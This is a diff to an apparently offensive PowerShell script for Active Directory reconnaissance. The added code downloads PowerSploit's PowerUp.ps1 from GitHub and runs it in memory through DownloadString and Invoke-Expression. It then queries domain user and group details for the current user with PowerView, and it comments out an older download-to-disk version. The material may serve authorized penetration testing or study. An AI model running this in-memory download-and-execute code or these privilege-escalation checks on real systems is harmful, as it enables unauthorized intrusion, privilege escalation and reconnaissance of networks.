@@ -73,6 +73,7 @@ Write-Host "Groups:`n$($groups -join "`n")"
 Write-Host "`n"
 Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
+
 ## Check for PowerView module and download if missing
 if (-not (Get-Help Get-DomainUser)) {
     Write-Output "PowerView module not found, downloading into memory..."
@@ -87,41 +88,39 @@ if (-not (Get-Help Get-DomainUser)) {
     Write-Output "PowerView already here!"
    }
 
-<#
-Write-Host "`n"
-Write-Host "Importing powerview and powerup modules"
-## Import powerview and powerup modules
-## Check for PowerView module and download if missing
-if (-not (Get-Module -Name PowerView -ListAvailable)) {
-    Write-Output "PowerView module not found, downloading to current directory..."
-    try {
-        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
-        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
-        Write-Output "PowerView downloaded successfully"
-    } catch {
-        Write-Output "Could not download PowerView: $($_.Exception.Message)"
-    }
-} else {
-    Write-Output "PowerView module found"
-}
-
 ## Check for PowerUp module and download if missing
-if (-not (Get-Module -Name PowerView -ListAvailable)) {
-    Write-Output "PowerView module not found, downloading to current directory..."
+if (-not (Get-Help Invoke-AllChecks)) {
+    Write-Output "PowerUp module not found, downloading into memory..."
     try {
-        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
-        $pwContent.Content | Out-File -FilePath ".\PowerView.ps1"
-        Write-Output "PowerView downloaded successfully"
-    } catch {
-        Write-Output "Could not download PowerView: $($_.Exception.Message)"
-    }
-} else {
-    Write-Output "PowerView module found"
-}
+      $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1')
+      Invoke-Expression $pwContent
+      Write-Output "PowerUp loaded successfully"
+     } catch {
+     Write-Output "Could not download PowerUp: $($_.Exception.Message)"
+   }
+   } else {
+    Write-Output "PowerUp already here!"
+   }
 
+Write-Host "`n"
+Write-Host "Getting Domain User and Group info from Powerview..."
+
+$identity = $env:USERNAME
+
+# Run Get-DomainUser command
+Get-DomainUser -Identity $identity
+
+# Run Get-DomainGroup command
+Get-DomainGroup -Identity $identity
+
+
+
+<#
+# DOWNLOAD SCRIPTS TO DISK AND IMPORT AS MODULES#
 Write-Host "`n"
 Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
+
 ## Check for PowerView module and download if missing
 if (-not (Get-Module -Name PowerView -ListAvailable)) {
     Write-Output "PowerView module not found, downloading to current directory..."
@@ -176,10 +175,4 @@ if (Test-Path ".\PowerUp.ps1") {
     }
         }
 #>
-$identity = $env:USERNAME
 
-# Run Get-DomainUser command
-Get-DomainUser -Identity $identity
-
-# Run Get-DomainGroup command
-Get-DomainGroup -Identity $identity
